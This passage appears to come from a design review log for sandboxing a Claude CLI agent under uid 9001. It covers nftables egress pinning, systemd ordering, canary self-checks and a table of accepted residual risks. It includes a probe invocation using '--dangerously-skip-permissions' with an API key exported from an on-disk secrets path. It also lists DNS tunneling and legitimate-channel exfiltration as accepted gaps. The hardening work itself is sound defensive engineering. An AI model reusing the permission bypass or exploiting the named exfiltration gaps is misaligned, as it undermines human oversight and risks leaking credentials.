| JD-6 | **RESOLVED — HA-09 probe invokes `/usr/bin/claude` directly in 2b.** Root cause: the 2b wrapper (`agent-run.sh`) is a production launcher that hardcodes `--permission-mode dontAsk -p "$(cat "$PROMPT_FILE")"` and discards `"$@"` entirely (beyond the HB-01.8 `-p` presence guard). The 2a probe invoked `"$wrapper" -p --output-format stream-json --verbose --dangerously-skip-permissions '<prompt>'`; routing that through the 2b wrapper would (a) discard `--output-format stream-json --verbose --dangerously-skip-permissions` → no stream-json `init` event → `permissionMode` absent → HB-05.1 broken; (b) inject `--permission-mode dontAsk` → HB-05.2 violated. Resolution: the probe exports `ANTHROPIC_API_KEY` from `AGENT_SECRETS_KEY` (`/etc/osgania/secrets/anthropic-api-key`, the provisioner's persistent on-disk path — `CREDENTIALS_DIRECTORY` is a systemd LoadCredential var unavailable outside service runtime) inline and calls `/usr/bin/claude -p --output-format stream-json --verbose --dangerously-skip-permissions '<benign prompt>'` directly. No `--permission-mode dontAsk`. HB-05.1 preserved (stream-json `init` event arrives intact). See HB-01.3, HB-05.2, HB-05.4, HB-05-S1; implementation in tasks U1-T2 (updated source assertion), U1-T7 (implementation). |

**Minors — RESOLVED:** HB-01.5 clarified (camara PostToolUse logs init/result events even without Bash tool execution — criterion met without tool execution); HB-02.7a tightened (BOTH service AND timer required, "and/or" removed); `restore` trap behavior defined in HB-06.2b (must kill/stop orphaned uid-9001 transient); HB-02.10 row added to requirements-to-scenario map (documentation requirement — no automated scenario); HB-06-S2b bats run-timeout note added.

---

## WU0-T7 polish applied

The following precision fixes were applied in a final surgical pass after JD Round 3 resolution:

| Fix | What changed |
|-----|-------------|
| RestrictAddressFamilies checklist | Design Checklist fail-closed-gate bullet now enumerates the full flag set including `--property=RestrictAddressFamilies='AF_INET AF_INET6'` |
| Canary positive-control (fail-open closed) | HB-06.2 expanded to THREE conditions: (a) nft table loaded, (b) root uid-0 positive-control connect SUCCEEDS, (c) uid-9001 self-check BLOCKED (exit 124). Root-connect failure → REFUSE + canary unusable report. |
| `TimeoutError` + ordering | Active python3 forms updated from `except socket.timeout` to `except TimeoutError`; normative ordering note added (`except TimeoutError` MUST precede `except OSError`). Historical RESOLVED notes quoting `socket.timeout` left as-is. |
| `tcp_syn_retries` / python3 preferred | Bash-form kernel-timeout caveat documented; python3 form declared PREFERRED/primary; bash `/dev/tcp` form is an acceptable fallback with caveat. |
| `restore()` canonical form | Mandated `--unit=osgania-egress-selfcheck` on the `systemd-run` invocation; `restore()` given a concrete form; no-op `restore` explicitly not sufficient. |
| Service AND timer | HB-06.2b and design Checklist boot-ordering bullet now explicitly require BOTH `osgania-agent.service` AND `osgania-agent.timer` carry `After=nftables.service` + `Wants=nftables.service` (cross-ref HB-02.7a). |
| ECONNREFUSED wording | Bash form: "ECONNREFUSED → non-zero (typically exit 1) → REFUSE" (bash `/dev/tcp` exit codes implementation-defined); python3 form: "ECONNREFUSED → exit 1 → REFUSE" (guaranteed by `sys.exit(1)`). Security behavior unchanged. |

---

## Tradeoffs and accepted residuals

| Item | Decision | Rationale |
|------|----------|-----------|
| Squid SNI proxy | DROPPED — replaced by nft IP-pin | `api.anthropic.com` is a STABLE PUBLISHED Anthropic range (not Cloudflare); IP-pin gives TRUE destination containment with no ECH weakness |
| DNS tunneling via local stub | Accepted residual | Bounded by key size (~108 bytes) and single-tenancy; the explore's alternative (IP-pin api.anthropic.com to drop DNS) was declined for fragility |
| Legitimate-channel exfil | Accepted irreducible | No filter can stop data leaving through a channel the agent must be permitted to use |
| A4 (guardia emits "allow") | Rejected | Hardware proved viable (exp5), but unnecessary — Amendment A1 (pass-through) achieves the same while keeping R1.4 intact |
| apt/NTP/upstream-DNS allowances | NOT required for uid 9001 | Hardware confirmed: apt=_apt/root, NTP=systemd-timesync, DNS=systemd-resolved — all OTHER uids; uid 9001 needs only loopback + Anthropic:443 |
